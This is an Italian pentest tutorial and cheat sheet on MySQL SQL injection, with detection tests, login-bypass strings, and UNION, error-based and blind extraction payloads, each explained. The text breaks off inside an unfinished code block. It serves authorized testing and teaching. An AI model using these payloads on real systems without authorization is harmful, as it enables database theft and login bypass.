---
title: 'SQL Injection MySQL: Payload, Cheat Sheet e Tecniche'
slug: sql-injection-mysql
description: 'SQL injection su MySQL: cheat sheet con payload UNION, error-based, blind, time-based, DIOS, RCE via UDF, OOB, bypass WAF e comandi sqlmap per pentest.'
image: /sql-injection-mysql-payload-exploitation-guida.webp
draft: false
date: 2026-10-11T18:27:22.419Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - SQL Injection
  - MySQL
  - WAF Bypass
  - sqlmap
---

# SQL Injection su MySQL: Guida Pratica a Payload, Enumerazione e Exploitation

La SQL injection su MySQL è una delle vulnerabilità web più vecchie e ancora oggi più trovate. In questa guida c'è tutto quello che serve per capirla e usarla in un test autorizzato: come riconoscerla, come estrarre dati con UNION, errori, blind e time-based, come leggere e scrivere file, come far parlare il database con l'esterno e come aggirare un WAF. Ogni payload è accompagnato da una spiegazione in parole semplici, così non devi solo copiare: capisci perché funziona.

Tutto quello che trovi qui va provato solo su lab e target autorizzati (Hack The Box, DVWA, PortSwigger Academy, CTF). Se vuoi la teoria generale prima di buttarti sui payload, parti da [SQL Injection](https://hackita.it/articoli/sql-injection/). Se il tuo target è Microsoft, c'è la guida gemella su [SQL Injection MSSQL](https://hackita.it/articoli/sql-injection-mssql/).

*Ultimo aggiornamento: ottobre 2026. Dove le tecniche cambiano tra MySQL 5.x, MySQL 8.x e MariaDB, la differenza è indicata nel paragrafo.*

***

## Cos'è la SQL Injection su MySQL

**La SQL injection su MySQL è una vulnerabilità che permette di inserire codice SQL dentro una query dell'applicazione e farlo eseguire dal database MySQL o MariaDB.** Con questa tecnica si leggono dati, si salta un login e, in certi casi, si leggono o si scrivono file sul server.

Un'applicazione web prende un valore che scrivi tu (un `id` nell'URL, un campo di login, una ricerca) e lo mette dentro una query SQL. Se non lo controlla, puoi scrivere SQL al posto del valore. A quel punto la query la decidi tu, non più lo sviluppatore.

Esempio di codice vulnerabile:

```php
$id  = $_GET['id'];
$sql = "SELECT title, body FROM posts WHERE id = '$id'";
```

Se mandi `?id=1` la query è normale. Se mandi `?id=1' OR '1'='1` la query diventa:

```sql
SELECT title, body FROM posts WHERE id = '1' OR '1'='1'
```

La condizione è sempre vera e ti restituisce tutti i post. Da qui in avanti il gioco è: capire **come l'applicazione ti mostra il risultato**, perché da quello dipende la tecnica da usare.

| Tecnica          | Cosa vedi                           | Quando si usa                                         |
| ---------------- | ----------------------------------- | ----------------------------------------------------- |
| UNION based      | I dati direttamente nella pagina    | La pagina stampa il risultato della query             |
| Error based      | I dati dentro un messaggio d'errore | L'app mostra gli errori SQL                           |
| Blind (booleana) | Pagina diversa se vero o falso      | Nessun output, ma la risposta cambia                  |
| Time based       | Un ritardo nella risposta           | Nessun output e risposta sempre uguale                |
| Out of band      | Una richiesta DNS o SMB verso di te | Niente funziona in banda, ma il DB può uscire in rete |

Per approfondire i due casi "ciechi" ci sono anche [Blind SQL Injection](https://hackita.it/articoli/blind-sql-injection/) e [Time Based SQL Injection](https://hackita.it/articoli/time-based-sql-injection/). Se il target è un'API o usa un ORM, guarda anche [SQL Injection API REST](https://hackita.it/articoli/sql-injection-api-rest/) e [SQL Injection ORM](https://hackita.it/articoli/sql-injection-orm/).

***

## Database di default in MySQL

Ti servono per sapere dove guardare.

| Nome                 | Descrizione                                                                                                                                                                                                                     |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mysql`              | Contiene utenti, hash e privilegi. Servono privilegi adeguati per leggerlo (tipicamente `SELECT` su `mysql.user`, che in pratica ha quasi sempre solo l'utenza amministrativa — ma non è detto che debba coincidere con `root`) |
| `information_schema` | Il "menu" del server: elenca database, tabelle e colonne. Disponibile dalla versione 5                                                                                                                                          |
| `performance_schema` | Statistiche interne del server (dalla 5.5)                                                                                                                                                                                      |
| `sys`                | Viste di comodo costruite sopra performance\_schema (dalla 5.7)                                                                                                                                                                 |

`information_schema` è la tua mappa: da lì estrai i nomi di tutto il resto.

### Informazioni utili da tirare fuori subito

| Cosa                            | Funzione o variabile             |
| ------------------------------- | -------------------------------- |
| Versione                        | `version()` oppure `@@version`   |
| Database in uso                 | `database()`                     |
| Utente corrente                 | `user()` oppure `current_user()` |
| Cartella dati                   | `@@datadir`                      |
| Sistema operativo               | `@@version_compile_os`           |
| Limite file (lettura/scrittura) | `@@secure_file_priv`             |
| Cartella dei plugin (UDF)       | `@@plugin_dir`                   |

La versione conta: molte tecniche funzionano solo da una certa versione in su. Questa tabella riassume le differenze principali.

### Compatibilità tra versioni

| Tecnica o funzione                            | Dove funziona                                                                  |
| --------------------------------------------- | ------------------------------------------------------------------------------ |
| `information_schema`                          | Da MySQL 5.0                                                                   |
| `NAME_CONST` (error-based)                    | Da MySQL 5.0                                                                   |
| `SLEEP()`                                     | Da MySQL 5.0.12 (prima si usa `BENCHMARK()`)                                   |
| `EXTRACTVALUE`, `UPDATEXML`                   | Da MySQL 5.1                                                                   |
| `information_schema.processlist`              | Da MySQL 5.1.7, deprecata in MySQL 8 (si usa `performance_schema.processlist`) |
| `GTID_SUBSET`                                 | Da MySQL 5.6                                                                   |
| `JSON_KEYS`                                   | Da MySQL 5.7                                                                   |
| `json_arrayagg()`                             | Da MySQL 5.7.22                                                                |
| `PROCEDURE ANALYSE()`                         | Fino a MySQL 5.7 (deprecata), rimossa in MySQL 8                               |
| Modalità SQL strict attiva di default         | Da MySQL 5.7 (rende inutile la truncation)                                     |
| Variabili utente dentro le espressioni (DIOS) | Funzionano, ma sono deprecate in MySQL 8 e possono dare risultati diversi      |

Se una tecnica non funziona, il primo controllo è sempre questo: **che versione è?**

***

## Commenti MySQL

Un commento serve a "buttare via" il resto della query originale, così il tuo payload chiude pulito.

| Tipo                     | Descrizione                                                                                      |
| ------------------------ | ------------------------------------------------------------------------------------------------ |
| `#`                      | Commento fino a fine riga. Nell'URL va scritto `%23`                                             |
| `-- `                    | Commento SQL. **Dopo i due trattini serve uno spazio**, per questo si scrive `-- -` oppure `--+` |
| `/* commento */`         | Commento in stile C                                                                              |
| `/*! codice */`          | Commento speciale: MySQL **esegue** quello che c'è dentro (vedi bypass WAF)                      |
| `/*!32302 10*/`          | Come sopra, ma eseguito solo da una certa versione in su                                         |
| `;%00`                   | Null byte: tronca la query in alcuni contesti                                                    |
| backtick (accento grave) | Non è un vero commento: chiude un nome di tabella o colonna e a volte serve per rompere la query |

Errore classico: usare `--` senza spazio finale e non capire perché non funziona.

***

## Come capire se il parametro è vulnerabile

Il primo passo è sempre lo stesso: mandi un carattere "rompi-query" e guardi cosa cambia. Provalo su **ogni** punto d'ingresso, non solo sui parametri GET: parametri POST, cookie, body JSON e header come `User-Agent`, `Referer` o `X-Forwarded-For`. Per trovare i parametri nascosti puoi usare [ffuf](https://hackita.it/articoli/ffuf/), per modificare le richieste al volo [Burp Suite](https://hackita.it/articoli/burp-suite/).

### Se il valore è una stringa

La query è tipo `SELECT * FROM Table WHERE id = 'FUZZ';`

| Input | Risultato atteso se vulnerabile |
| ----- | ------------------------------- |
| `'`   | Errore o pagina rotta (False)   |
| `''`  | Pagina normale (True)           |
| `"`   | Errore (False)                  |
| `""`  | Pagina normale (True)           |
| `\`   | Errore (False)                  |
| `\\`  | Pagina normale (True)           |

Logica: un apice solo lascia la stringa aperta e rompe la query. Due apici si annullano e la query torna valida. Se vedi questo comportamento, il parametro finisce nella query senza protezione.

### Se il valore è un numero

La query è tipo `SELECT * FROM Table WHERE id = FUZZ;` (senza apici).

| Input                 | Cosa succede                                                     |
| --------------------- | ---------------------------------------------------------------- |
| `AND 1` / `AND true`  | Pagina normale (True)                                            |
| `AND 0` / `AND false` | Pagina diversa o vuota (False)                                   |
| `1-false`             | Restituisce 1 se vulnerabile                                     |
| `1-true`              | Restituisce 0 se vulnerabile                                     |
| `1*56`                | Restituisce il record 56 se vulnerabile, il record 1 se non lo è |

L'ultimo test è il più elegante: se la pagina cambia da `id=1` a `id=1*56` e mostra il record 56, il server ha fatto il calcolo. Quindi il tuo input viene eseguito come SQL.

### Se è un form di login

La query è tipo `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

```
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'='
'LIKE'
'=0--+
```

Questi payload puntano a rendere la condizione sempre vera, ma se funzionano e chi accede dipende dalla query esatta usata dall'applicazione: parentesi, `LIMIT`, `ORDER BY` o controlli aggiuntivi lato codice possono far fallire il payload anche se il parametro è davvero vulnerabile — in quel caso adatta la sintassi al contesto specifico, non scartare la pista. Controlla sempre **quale utente** ti viene dato: spesso è il primo della tabella restituito dalla query, che è spesso ma non sempre l'admin.

***

## UNION Based

### Cos'è UNION, prima dei payload

`UNION` è un operatore SQL "normale", che esiste per un motivo del tutto legittimo: unire i risultati di **due `SELECT` separate** in un'unica tabella di output, una sopra l'altra. Un sito potrebbe usarlo per mostrare in una lista sia i prodotti che le offerte, per esempio:

```sql
SELECT nome, prezzo FROM prodotti
UNION
SELECT nome, prezzo FROM offerte;
```

Il trucco della UNION based injection è semplice da capire una volta visto questo: se riesci a scrivere codice SQL dentro il parametro vulnerabile, puoi **aggiungere tu una seconda `SELECT` con `UNION`**, e MySQL ti restituirà il risultato di quella seconda query insieme (o al posto di) quello originale. Se l'applicazione stampa a video il risultato della query, stampa anche il tuo. Da qui la tecnica prende il nome: è "l'unione" che usi per far uscire dati che normalmente non vedresti.

È la tecnica più comoda perché, se funziona, i dati compaiono direttamente nella pagina — niente bisezione carattere per carattere, niente tempi di attesa.

La regola di ferro: la tua `SELECT` deve avere **lo stesso numero di colonne** di quella originale. Quindi il primo lavoro è contarle.

### Contare le colonne

**Metodo 1: NULL iterativo.** Aggiungi un `NULL` alla volta finché l'errore sparisce.

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;--
UNION SELECT NULL, NULL, NULL;--
```

Si usa `NULL` perché è compatibile con qualsiasi tipo di colonna.

**Metodo 2: ORDER BY (o GROUP BY).** Ordini per la colonna numero 1, 2, 3... finché non ottieni un errore.

| ORDER BY        | GROUP BY        | Risultato |
| --------------- | --------------- | --------- |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True      |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True      |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True      |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False     |

Il 4 dà errore, quindi la query ha **3 colonne**. Se l'app mostra gli errori, puoi farlo in una richiesta sola:

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
-- Errore: Unknown column '4' in 'order clause'
```

L'errore ti dice direttamente qual è la prima colonna che non esiste. Lo stesso trucco funziona con `1' GROUP BY 1,2,3,4,5--+`: l'errore indica da quale numero la colonna non esiste più.

**Metodo 3: LIMIT INTO.** Utile quando il punto di injection si trova dopo un `LIMIT` e `ORDER BY` non funziona. Funziona solo se gli errori sono visibili.

| Payload                      | Errore                                                        |
| ---------------------------- | ------------------------------------------------------------- |
| `1' LIMIT 1,1 INTO @--+`     | The used SELECT statements have a different number of columns |
| `1' LIMIT 1,1 INTO @,@--+`   | The used SELECT statements have a different number of columns |
| `1' LIMIT 1,1 INTO @,@,@--+` | Nessun errore: la query usa 3 colonne                         |

### Vedere quali colonne sono stampate

Trovato il numero di colonne, usa un `id` che non esiste (per esempio `-1`) così la query originale non restituisce nulla e vedi solo la tua riga:

```sql
-1' UNION SELECT 1,2,3--+
```

Nella pagina compariranno magari solo il 2 e il 3. Sono le colonne dove puoi far uscire i dati. Se una colonna rifiuta il dato per un problema di tipo, rimetti `NULL` al suo posto.

### Cos'è information\_schema

Per leggere dati "a bersaglio" (invece di inventarti nomi di tabelle a caso) ti serve sapere **come è fatto il database**: quali database esistono, quali tabelle ha ciascuno, quali colonne ha ciascuna tabella. Questa informazione non te la dà un comando magico: è semplicemente **salvata in un altro database**, che MySQL crea sempre automaticamente e chiama `information_schema`.

`information_schema` è un database di sistema fatto di tabelle "normali" che puoi interrogare con `SELECT` come qualsiasi altra — solo che contengono la mappa dell'intero server invece dei tuoi dati applicativi. Le tre che userai sempre sono:

| Vista                         | Cosa contiene                                        | Colonne utili                                                                                |
| ----------------------------- | ---------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| `information_schema.schemata` | L'elenco di **tutti i database** presenti sul server | `schema_name` (il nome del database)                                                         |
| `information_schema.tables`   | L'elenco di **tutte le tabelle** di tutti i database | `table_schema` (in quale database si trova la tabella), `table_name` (il nome della tabella) |
| `information_schema.columns`  | L'elenco di **tutte le colonne** di tutte le tabelle | `table_schema`, `table_name`, `column_name` (il nome della colonna)                          |

Nota il pattern: ogni riga di `tables` e `columns` porta sempre con sé anche `table_schema`, perché due database diversi possono avere una tabella con lo stesso nome (es. `users` in `app_prod` e in `app_test`) — senza `table_schema` non sapresti a quale ti riferisci. Lo stesso principio vale a cascata: `columns` porta sia `table_schema` che `table_name`, perché due tabelle diverse possono avere una colonna con lo stesso nome.

Il percorso logico è sempre: prima `schemata` (che database ci sono) → poi `tables` filtrando su quel database (che tabelle ha) → poi `columns` filtrando su quella tabella (che colonne ha) → infine la `SELECT` sulla tabella vera per leggere i dati. Gli esempi sotto seguono esattamente questo ordine.

### Estrarre database, tabelle, colonne e dati con information\_schema

**Tutti i database:**

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

**Tutte le tabelle di un database** (al posto di `PLACEHOLDER` metti il nome, oppure `database()` per quello corrente):

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

**Tutte le colonne di una tabella:**

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

**I dati veri e propri:**

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

I `...` indicano che devi riempire con tanti campi quante sono le colonne della query originale. Un esempio concreto su 3 colonne:

```sql
-1' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password) FROM users-- -
```

Due dettagli che salvano la giornata:

* `0x7c` è il carattere `|` scritto in esadecimale. Si usa l'esadecimale per evitare gli apici, che spesso sono filtrati. Stessa cosa per `0x3a` che è `:`.
* `GROUP_CONCAT` ha un limite: di default taglia l'output a **1024 caratteri**. Se i dati sembrano troncati, estrai una riga alla volta con `LIMIT 0,1`, `LIMIT 1,1`... oppure usa la variante `json_arrayagg()` che vedi nella sezione WAF.
* Per vedere solo le tabelle dell'applicazione e non quelle di sistema, aggiungi un filtro: `WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')`. Aggiungendo `AND table_type='BASE TABLE'` escludi anche le viste.

### Cercare le tabelle partendo dal nome della colonna

Non sai in quale tabella sono gli utenti? Cerca per colonna: ti porta dritto alle tabelle interessanti.

```sql
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

Nomi da provare: `user`, `pass`, `password`, `token`, `email`, `secret`, `api`. In un lab è spesso il modo più veloce per trovare la tabella degli utenti.

### Estrarre i nomi delle colonne senza information\_schema

Se `information_schema` è bloccato (o un WAF lo filtra), puoi far "confessare" i nomi delle colonne al database tramite gli errori.

**MySQL 4.1 e superiori:**

| Payload                                                                   | Output                                 |
| ------------------------------------------------------------------------- | -------------------------------------- |
| `(1)and(SELECT * from db.users)=(1)`                                      | Operand should contain **4** column(s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null         |

Il primo ti dice quante colonne ha la tabella. Il secondo confronta una riga inventata con la tabella e l'errore ti rivela il nome della prima colonna.

**MySQL 5:** si sfrutta il `JOIN` di una tabella con se stessa, che genera errori di "colonna duplicata".

| Payload                                                                  | Output                           |
| ------------------------------------------------------------------------ | -------------------------------- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                | Duplicate column name '**id**'   |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`      | Duplicate column name '**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | I dati                           |

Ogni volta che aggiungi la colonna appena scoperta dentro `USING(...)`, MySQL ti rivela la successiva. Alla fine non ci sono più duplicati e ottieni i dati.

### Estrarre i dati senza conoscere i nomi delle colonne

Se non conosci nemmeno i nomi, puoi chiamare le colonne per **numero**, con i backtick. Qui estraiamo la quarta colonna:

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

Funziona perché la sottoquery con `UNION` crea una tabella temporanea le cui colonne si chiamano proprio `1`, `2`, `3`... Esempio dentro una query reale `select author_id,title from posts where author_id=[INJECT_HERE]`:

```sql
SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
```

```
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

Il numero di colonne della tabella target (qui 6) lo ricavi con i metodi del paragrafo precedente. Gli hash che trovi li puoi poi craccare con [Hashcat](https://hackita.it/articoli/hashcat/).

***

## Error Based

Se l'applicazione mostra gli errori di MySQL, puoi costringere il database a scrivere i dati **dentro il messaggio d'errore**. È veloce e non richiede UNION.

L'idea: usi una funzione che va in errore se riceve un valore "sbagliato", e quel valore sbagliato è il dato che vuoi leggere.

| Nome                | Payload                                                                                                                                                                |
| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| GTID\_SUBSET        | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -`                                                                                                        |
| JSON\_KEYS          | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -`                                                                         |
| EXTRACTVALUE        | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -`                                                                                                   |
| UPDATEXML           | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -`                                                                                                |
| EXP                 | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -`                                                                                      |
| OR (GROUP BY)       | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -`                                                                                 |
| NAME\_CONST         | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--`                                                                                  |
| UUID\_TO\_BIN       | `AND UUID_TO_BIN(version())='1`                                                                                                                                        |
| GROUP BY (variante) | `AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))` |

I `~` attorno al dato servono come "segnalibri": nel messaggio d'errore li vedi subito e capisci dove inizia e finisce il valore estratto. Non tutte le funzioni esistono su tutte le versioni (per esempio `JSON_KEYS` è 5.7+ e `GTID_SUBSET` è 5.6+), e alcune sono state sistemate nelle versioni recenti: se una non funziona, prova la successiva.

**Nota su `UUID_TO_BIN`:** a differenza delle altre righe della tabella, non è una tecnica error-based verificata e riproducibile allo stesso modo — `UUID_TO_BIN()` si aspetta una stringa UUID valida e genera un errore se l'argomento non lo è, ma questo da solo non garantisce che il contenuto di `version()` (o di qualsiasi altro dato) venga restituito in modo leggibile nel messaggio. Trattala come un payload da testare e verificare sul tuo target, non come equivalente garantito di `EXTRACTVALUE`/`UPDATEXML`.

### Error based: versione base (MySQL 4.1 e superiori)

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

È il classico "double query": `RAND()` dentro un `GROUP BY` genera un errore di chiave duplicata che contiene il valore concatenato.

### Error based: UPDATEXML

`UPDATEXML` si aspetta un percorso XPath valido. Gli passi un dato che non lo è e l'errore te lo stampa.

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Versione più corta e facile da leggere:

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

`data_offset`, `data_column`, `data_table` e `data_info` sono segnaposto: li sostituisci con il numero della riga (0, 1, 2...), il database, la tabella e la colonna che stai enumerando. `CHAR(126)` è la tilde `~`.

### Error based: EXTRACTVALUE (MySQL 5.1 e superiori)

Stessa logica di `UPDATEXML`, funzione diversa:

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

**Limite da ricordare:** con `EXTRACTVALUE` e `UPDATEXML` il messaggio d'errore mostra al massimo circa **32 caratteri** del dato. Per hash e testi lunghi devi spezzarli con `SUBSTRING(dato,1,31)`, poi `SUBSTRING(dato,32,31)` e così via.

### Error based: NAME\_CONST (MySQL 5.0 e superiori, solo costanti)

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

`NAME_CONST` accetta solo valori costanti, quindi qui puoi leggere `version()`, `user()`, `database()` ma non fare una `SELECT` su una tabella.

***

## Blind SQL Injection

Qui non vedi nulla: né dati né errori. Ma la pagina **si comporta in modo diverso** se la tua condizione è vera o falsa. Quindi fai al database domande del tipo "il primo carattere della versione è 5?" e leggi la risposta dal comportamento della pagina. Un carattere alla volta, una domanda alla volta.

### Le funzioni per "tagliare" una stringa

Per interrogare un carattere alla volta ti servono funzioni che estraggono un pezzo di stringa. In MySQL ce ne sono diverse, e se un filtro ne blocca una puoi usarne un'altra.

| Funzione    | Esempio                        | Cosa fa                                |
| ----------- | ------------------------------ | -------------------------------------- |
| `SUBSTR`    | `SUBSTR(version(),1,1)=5`      | Estrae un pezzo da qualsiasi posizione |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`   | Identica a `SUBSTR`                    |
| `MID`       | `MID(version(),1,1)=4`         | Identica a `SUBSTR`                    |
| `LEFT`      | `LEFT(version(),1)=4`          | Prende N caratteri da sinistra         |
| `RIGHT`     | `RIGHT(left(version(),1),1)=5` | Prende N caratteri da destra           |

Il formato è `FUNZIONE(stringa, posizione, lunghezza)`: `SUBSTR(version(),1,1)` significa "dalla posizione 1, prendi 1 carattere", cioè il primo carattere.

Esempi:

```sql
?id=1 AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 1) > 'A'
?id=1 AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns LIMIT 1) > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

Nota il giro di vite: `AND (SELECT ...)` non `AND SELECT ...` — in una condizione serve una sottoquery scalare, racchiusa tra parentesi, altrimenti è un errore di sintassi. Quel `LIMIT 1` è necessario perché `information_schema.tables` ha più righe: senza di esso MySQL si lamenta che la sottoquery restituisce più di un risultato. Se devi scorrere riga per riga (tabella 0, poi 1, poi 2...) usa `LIMIT 1 OFFSET n` come visto sopra.

`ASCII()` trasforma il carattere nel suo numero (51 è il carattere `3`). Lavorare con i numeri ti permette di usare `>` e `<` e trovare il carattere **per bisezione**: invece di provare tutto l'alfabeto, dimezzi l'intervallo a ogni richiesta. Con 7 richieste trovi qualsiasi carattere ASCII.

### Blind con una condizione IF

```sql
' OR IF(MID(@@version,1,1)='5', (SELECT 1 UNION SELECT 2), 1)='1
```

Come leggerlo: `IF(condizione, se_vero, se_falso)`. Se il primo carattere di `@@version` è `5`, il ramo "vero" esegue una sottoquery che restituisce **due righe** (`UNION`) dove l'applicazione si aspettava una sola riga: molte query falliscono con un errore quando questo accade (es. in un contesto `WHERE id = (sottoquery)`), e tu vedi un 500 al posto di un 200. Se il primo carattere non è `5`, il ramo "falso" restituisce semplicemente `1` e la query gira normale.

Il vantaggio di questa versione rispetto a usare `SLEEP()` nel ramo vero: la differenza è immediata (un errore o una risposta diversa), non legata a un ritardo che potresti confondere con la normale latenza di rete — utile quando il time-based è troppo rumoroso o il WAF filtra `SLEEP`.

Se invece l'applicazione non genera errori visibili in nessun caso, torna al time-based: metti `SLEEP()` nel ramo vero e misura il ritardo, come nella sezione successiva.

### Blind con MAKE\_SET

`MAKE_SET` restituisce qualcosa se la condizione è vera e niente se è falsa, quindi la risposta della pagina cambia. `VALUE_TO_EXTRACT` è il numero che stai provando, `POS` la posizione del carattere.

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

Le prime righe ti danno la **lunghezza** del dato, le altre i **caratteri**. Prima la lunghezza, poi i caratteri: così sai quando fermarti.

### Blind con LIKE

`LIKE` confronta una stringa con un modello. Due jolly:

* `%` sta per "zero, uno o più caratteri qualsiasi"
* `_` sta per "esattamente un carattere qualsiasi"

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

Nel blind è comodissimo perché puoi indovinare **la lunghezza** (`'___'` = 3 caratteri) e poi i caratteri uno a uno senza `SUBSTR`. Attenzione: `LIKE` non distingue maiuscole da minuscole con la collation di default. Se ti serve la differenza usa `LIKE BINARY 'A%'`.

### Blind con REGEXP

`REGEXP` confronta con un'espressione regolare, quindi puoi fare test molto più potenti di `LIKE`.

| Payload                                                                | Cosa controlla                |
| ---------------------------------------------------------------------- | ----------------------------- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Lunghezza: almeno 8 caratteri |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Presenza di cifre             |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Dato che inizia per "a"       |

Con una sola richiesta puoi testare una classe di caratteri (`[a-f]`, `[0-9]`) e restringere molto più in fretta.

***

## Estrazione di dati binari, multibyte e bisezione passo passo

Finora gli esempi assumono stringhe ASCII semplici. In un test reale il dato può essere binario (un hash, una password cifrata), multibyte (nomi con accenti, caratteri non latini) o `NULL` — casi che rompono un payload scritto senza pensarci.

### HEX/UNHEX invece di stringhe tra apici

```sql
' UNION SELECT HEX(password) FROM users-- -
SELECT UNHEX('61646d696e')
```

`HEX()` converte qualsiasi valore (compreso binario puro) in una stringa di cifre esadecimali che non contiene apici, spazi o caratteri speciali — utile sia per portare fuori dati binari senza che si rompano nel trasporto HTTP, sia come alternativa a `char()`/concatenazione quando gli apici sono filtrati. `UNHEX()` fa il percorso inverso.

### ORD() al posto di ASCII() per caratteri multibyte

`ASCII()` restituisce solo il valore del **primo byte**, che con charset multibyte (UTF-8, dati con accenti o caratteri non latini) non corrisponde al carattere intero. `ORD()` restituisce il codice del primo carattere multibyte completo:

```sql
